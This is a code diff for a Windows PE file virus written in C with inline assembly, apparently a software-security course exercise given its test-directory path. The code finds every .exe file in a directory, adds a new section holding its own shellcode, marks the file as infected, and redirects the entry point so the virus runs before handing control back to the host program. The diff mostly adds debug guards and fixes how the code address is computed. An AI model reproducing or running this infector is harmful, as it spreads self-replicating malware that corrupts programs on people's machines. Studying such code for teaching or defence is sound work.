@@ -93,15 +93,18 @@ typedef struct SHELL_CODE_SUPER_BLOCK {
 // #define DEBUG_STATIC // use api static
 
 // #define DEBUG
+#define DEBUG_ABS // use absolute path
+#define DEBUG_ASM // use asm tags
+
+#ifdef DEBUG_ASM
+#define ASM_TAG __asm{ xchg bx, bx }
+#else
+#define ASM_TAG
+#endif
 
 #ifdef DEBUG
 #include <stdio.h>
 #include <string.h>
-#endif
-
-__forceinline void noputs(const char *ptr) { return; } 
-#ifndef DEBUG
-#define puts noputs
 #endif
 
 #ifndef DEBUG_STATIC
@@ -240,11 +243,15 @@ __forceinline DWORD FindBase(PWCHAR DemandModuleName, PEB *peb) {
 
 __forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
+#ifdef DEBUG
         puts("Error when set file pointor!");
+#endif
         return 1;
     }
     if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
+#ifdef DEBUG
         puts("Error when read file!");
+#endif
         return 2;
     }
     return 0;
@@ -252,23 +259,30 @@ __forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, voi
 
 __forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
     if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
+#ifdef DEBUG
         puts("Error when set file pointor!");
+#endif
         return 1;
     }
     if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
+#ifdef DEBUG
         puts("Error when write file!");
+#endif
         return 2;
     }
     return 0;
 }
-
 __forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
     if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+#ifdef DEBUG
         puts("Error when set file pointor!");
+#endif
         return 1;
     }
     if(SetEndOfFile(hFile) == FALSE) {
+#ifdef DEBUG
         puts("Error when modify size!");
+#endif
         return 2;
     }
     return 0;
@@ -287,11 +301,12 @@ __forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
     );
     return hFile;
 }
-
 __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     int err = 0;
 //----------------------------------------------------------------------
+#ifdef DEBUG
     puts("Init header pointers...");
+#endif DEBUG
     // headers
     /* init in struct SCSB */
     // headers pointer
@@ -301,7 +316,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
     PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
 //----------------------------------------------------------------------
+#ifdef DEBUG
     puts("Parse headers...");
+#endif
     // Get DOS Header
     err = ReadOffset(
         sb, hFile, 0, FILE_BEGIN, 
@@ -310,7 +327,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     if(err) return -1;
     // Check infected
     if(pDosHdr->e_res[0] == 0x1234) {
+#ifdef DEBUG
         puts("Error: Target has been infected!");
+#endif
         return 1;
     }
     // Check Signature
@@ -321,7 +340,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
     if(pe00 != 0x00004550) {
+#ifdef DEBUG
         puts("Error: Not a pe file!");
+#endif
         return 2;
     }
     // Get File Header
@@ -339,7 +360,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
     if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
+#ifdef DEBUG
         puts("Error: Not a 32 bits exe!");
+#endif
         return 3;
     }
     // Check Headers Space
@@ -350,7 +373,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
         + pFileHdr->SizeOfOptionalHeader;
     long alignSize = pOptHdr->SizeOfHeaders;
     if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
+#ifdef DEBUG
         puts("Error: No space to insert a new sections!");
+#endif
         return 4;
     }
     // Get Last Section Header
@@ -360,7 +385,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     );
     if(err) return -1;
 //----------------------------------------------------------------------
+#ifdef DEBUG
     puts("Calc address...");
+#endif
     // Get align
     long fileAlign = pOptHdr->FileAlignment;
     long secAlign = pOptHdr->SectionAlignment; 
@@ -405,7 +432,9 @@ __forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
     pOptHdr->AddressOfEntryPoint = rvaNewSec;
     pOptHdr->SizeOfImage = rvaNewSec + vir_size;
 //----------------------------------------------------------------------
+#ifdef DEBUG
     puts("Save changing...");
+#endif
     // Saved Dos Header
     err = WriteOffset(
         sb, hFile, 0, FILE_BEGIN,
@@ -486,14 +515,20 @@ __forceinline void GetAllFunc(PEB *peb, SCSB *sb) {
 
 __forceinline void ShellCodeMain(SCSB *sb) {
     // find exe in cwd
+#ifdef DEBUG_ABS
+    CHAR search[58] = {'D', ':', '\\', '_', '_', 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '_', 'S', 'e', 'c', '_', '_', '\\', 'P', 'E', '_', 'V', 'i', 'r', 'u', 's', '\\', 'e', 'x', 'a', 'm', 'p', 'l', 'e', 's', '\\', 't', 'e', 's', 't', '\\', 't', 'e', 's', 't', '_', 'd', 'i', 'r', '\\', '*', '.', 'e', 'x', 'e', 0};
+#else
     CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
+#endif
     WIN32_FIND_DATAA findData;
     HANDLE hFind = FindFirstFileA(search, &findData);
     if(hFind == INVALID_HANDLE_VALUE) return;
     // iterate files
     LPWIN32_FIND_DATAA lpFindData = &findData;
     do {
+#ifdef DEBUG
         puts(lpFindData->cFileName);
+#endif
         HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
         if(hf == NULL) continue;
         InfectTarget(sb, hf);
@@ -507,25 +542,25 @@ __forceinline void ShellCodeMain(SCSB *sb) {
 
 void ShellCode() {
 __code_start:
+    ASM_TAG
+#ifdef DEBUG
+    puts("In Shell Code!");
+#endif
     SCSB super_block;
     SCSB *sb = &super_block;
     PPEB peb;
-    DWORD imageBase;
+    PBYTE imageBase;
     // get peb
     __asm {
         mov eax, fs:[30h];
         mov peb, eax
     }
     // get imageBase
-    imageBase = (DWORD)peb->Reserved3[1];
-    // Get funtion pointer
-    GetAllFunc(peb, sb);
+    imageBase = (PBYTE)peb->Reserved3[1];
     // Get Code info
     PBYTE codeAdr;
     DWORD codeSize, jmpPoint;
     __asm {
-        mov eax, __code_start
-        mov codeAdr, eax
         mov eax, __code_end
         sub eax, __code_start
         mov codeSize, eax
@@ -534,14 +569,24 @@ __code_start:
         add eax, 1
         mov jmpPoint, eax
     }
+    // for shellcode, codeRva = entryRva
+    codeAdr = (PBYTE) *(DWORD *)(imageBase + 0x3C); 
+    codeAdr = codeAdr + (DWORD)imageBase;// optHdr
+    codeAdr = *(DWORD *)(codeAdr + 0x28); // entry rva
+    codeAdr = codeAdr + (DWORD)imageBase; 
     sb->_shellCode = codeAdr;
-    sb->_CODE_SIZE = codeSize;
-    sb->_JMP_POINT_OFFSET = jmpPoint;
+    sb->_CODE_SIZE = codeSize + 0xA; // 0xA is stack pointer operations
+    sb->_JMP_POINT_OFFSET = jmpPoint + 0xA;
 #ifdef DEBUG
-    printf("Codeinfo: %p %d %d\n", codeAdr, codeSize, jmpPoint);
+    printf("Base:%#p Codeinfo: %#p %d %d\n", imageBase, codeAdr, codeSize, jmpPoint);
 #endif
+    // Get funtion pointer
+    GetAllFunc(peb, sb);
     // Start infecting
     ShellCodeMain(sb);
+#ifdef DEBUG
+    printf("ss: %#p\n", imageBase);
+#endif
     // Return back
     __asm {
         mov eax, imageBase
@@ -549,6 +594,7 @@ __jmp_point:
         add eax, 0x11223344
         jmp eax
     }
+    ASM_TAG
 __code_end:
     return;
 }
